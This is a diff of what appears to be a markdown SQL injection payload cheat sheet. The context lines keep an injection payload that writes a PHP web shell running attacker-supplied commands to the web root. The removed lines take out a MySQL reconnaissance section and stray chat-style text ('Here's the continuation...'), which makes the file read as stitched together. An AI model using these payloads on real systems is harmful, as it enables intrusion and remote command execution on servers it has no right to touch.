@@ -129,22 +129,6 @@ Read/write files (if DB permissions allow):
 '; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/shell.php' -- 
 ```
 
----
-
-### **8. Database-Specific Payloads**
-
-#### **MySQL / MariaDB**
-```sql
--- Version check  
-SELECT @@version  
-
--- List databases  
-SELECT schema_name FROM information_schema.schemata
-
-```
-Continue from Database specific payloads
-
- Here's the continuation of database-specific SQL injection payloads:
 
 ---
 
